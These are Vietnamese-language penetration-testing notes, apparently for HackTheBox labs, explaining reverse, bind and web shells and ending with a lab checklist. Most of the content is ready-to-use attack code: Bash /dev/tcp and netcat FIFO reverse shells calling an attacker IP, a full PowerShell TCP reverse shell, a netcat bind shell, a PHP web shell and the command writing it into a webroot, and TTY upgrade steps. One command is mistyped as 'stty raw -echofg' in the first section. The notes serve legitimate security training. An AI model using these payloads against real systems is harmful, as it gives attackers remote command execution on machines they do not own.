# Types of Shells
## Ý chính 
- Sau khi khai thác được một lỗ hổng và có khả năng thực thi lệnh trên target, ta cần một cách giao tiếp ổn định với hệ thống để không phải exploit lại mỗi khi muốn chạy command.
- Có 3 loại shell chính:
	- Reverse shell: Target kết nối ngược về attacker
	- Bind Shell: Target mở port lắng nghe, attacker kết nối vào
	- Web Shell: Gửi command qua HTTP, server thực thi và trả output

---
## Reverse Shell 
- Reverse shell là loại shell phổ biến nhất.
- Mô hình:
```text
Attacker mở listener
Target chạy payload kết nối về attacker
Attacker nhận shell
```

Mở listener:

```
nc -lvnp 1234
```

Ý nghĩa flag:

```
-l: listen mode
-v: verbose
-n: không DNS resolve
-p: port lắng nghe
```

Tìm IP attacker trong HTB:

```
ip a
```

Thường dùng IP của interface:

```
tun0
```

Payload Bash reverse shell:

```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

Payload Netcat FIFO:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Ưu điểm:

- Nhanh
- Dễ dùng
- Phù hợp khi target cho outbound connection

Nhược điểm:

- Dễ mất kết nối
- Nếu shell chết thì phải exploit lại để chạy payload

---

## Bind Shell

Bind shell là loại shell mà target mở port lắng nghe.

Mô hình:

```
Target mở port 1234
Attacker connect tới target:1234
Attacker nhận shell
```

Payload Linux:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Attacker kết nối:

```
nc TARGET_IP 1234
```

Ưu điểm:

- Nếu mất kết nối, có thể connect lại nếu bind shell vẫn chạy

Nhược điểm:

- Dễ bị firewall chặn inbound connection
- Nếu target reboot hoặc process chết thì mất shell

---

## Upgrade TTY

Netcat shell thường rất thô:

- Không có command history
- Không dùng phím mũi tên tốt
- Không tab completion tốt
- Ctrl+C có thể làm chết shell

Upgrade bằng Python:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```
Ctrl + Z
```

Trên máy attacker:

```
stty raw -echofg
```

Sau đó nhấn Enter.

Set terminal:

```
export TERM=xterm-256color
stty rows 67 columns 318
```

Lấy thông tin terminal local:

```
echo $TERM
stty size
```

---

## Web Shell

Web shell là file script đặt trong webroot, nhận command qua HTTP parameter.

PHP web shell:

```
<?php system($_REQUEST["cmd"]); ?>
```

Ghi web shell vào Apache webroot:

```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Truy cập bằng browser:

```
http://SERVER_IP:PORT/shell.php?cmd=id
```

Hoặc bằng curl:

```
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

Default webroot:

| Web Server | Webroot                  |
| ---------- | ------------------------ |
| Apache     | `/var/www/html/`         |
| Nginx      | `/usr/local/nginx/html/` |
| IIS        | `c:\inetpub\wwwroot\`    |
| XAMPP      | `C:\xampp\htdocs\`       |

Ưu điểm:

- Chạy qua port web đang mở
- Có thể bypass firewall vì không cần mở port mới
- Nếu file vẫn còn, reboot xong vẫn có thể dùng lại

Nhược điểm:

- Không tương tác tốt
- Mỗi command là một HTTP request
- Dễ bị phát hiện nếu để lại file shell

---

## So sánh nhanh

|Tiêu chí|Reverse Shell|Bind Shell|Web Shell|
|---|---|---|---|
|Ai mở listener?|Attacker|Target|Web server sẵn có|
|Ai kết nối tới ai?|Target → Attacker|Attacker → Target|Attacker → Web app|
|Có cần port mới?|Có, trên attacker|Có, trên target|Không, dùng port web|
|Dễ bị firewall chặn?|Nếu outbound bị chặn|Nếu inbound bị chặn|Ít hơn, vì dùng HTTP/HTTPS|
|Tương tác tốt?|Tốt|Tốt|Kém hơn|
|Bền sau reboot?|Không|Không|Có thể có nếu file còn tồn tại|

# 4. Checklist làm lab
## A. Chuẩn bị chung
- [ ] Xác định target là Linux hay Windows
- [ ] Xác định có RCE, file upload, LFI/RFI, command injection hay exploit nào không-
- [ ] [ ] Xác định IP attacker nhận shell:
```bash
ip a
```

- [ ]  Nếu làm HTB, ưu tiên IP của `tun0`
- [ ]  Chọn port listener, ví dụ `1234`, `4444`, `9001`
- [ ]  Kiểm tra port có bị dùng chưa:

```
ss -tulnp | grep 1234
```

---

## B. Reverse Shell

- [ ]  Mở listener trên attacker:

```
nc -lvnp 1234
```

- [ ]  Chọn payload phù hợp với target

Linux Bash:

```
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'
```

Linux Netcat FIFO:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f
```

Windows PowerShell:

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

- [ ]  Thực thi payload thông qua RCE/exploit/upload
- [ ]  Khi nhận shell, kiểm tra:

```
id
whoami
hostname
pwd
```

---

## C. Bind Shell

- [ ]  Chạy bind shell payload trên target:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

- [ ]  Từ attacker kết nối vào target:

```
nc TARGET_IP 1234
```

- [ ]  Kiểm tra shell:

```
id
whoami
hostname
```

- [ ]  Nếu không connect được:
    - [ ]  Kiểm tra firewall
    - [ ]  Kiểm tra port có mở không
    - [ ]  Kiểm tra target có bind trên `0.0.0.0` hay chỉ `127.0.0.1`

---

## D. Upgrade TTY

- [ ]  Trong shell Netcat chạy:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

hoặc nếu chỉ có Python 3:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- [ ]  Nhấn:

```
Ctrl + Z
```

- [ ]  Trên terminal attacker:

```
stty raw -echo
fg
```

- [ ]  Nhấn Enter
- [ ]  Set terminal:

```
export TERM=xterm-256color
```

- [ ]  Lấy size terminal local:

```
stty size
```

- [ ]  Set rows/columns trong shell:

```
stty rows <rows> columns <columns>
```

---

## E. Web Shell

- [ ]  Xác định webroot:

```
Apache: /var/www/html/
Nginx: /usr/local/nginx/html/
IIS: c:\inetpub\wwwroot\
XAMPP: C:\xampp\htdocs\
```

- [ ]  Tạo PHP web shell nếu có quyền ghi:

```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

- [ ]  Gọi thử command:

```
curl http://TARGET_IP:PORT/shell.php?cmd=id
```

- [ ]  Chạy các command cơ bản:

```
curl http://TARGET_IP:PORT/shell.php?cmd=whoami
curl http://TARGET_IP:PORT/shell.php?cmd=hostname
curl http://TARGET_IP:PORT/shell.php?cmd=pwd
```

- [ ]  Nếu cần khoảng trắng hoặc ký tự đặc biệt, URL encode command
- [ ]  Sau lab, xóa web shell nếu cần cleanup:

```
rm /var/www/html/shell.php
```

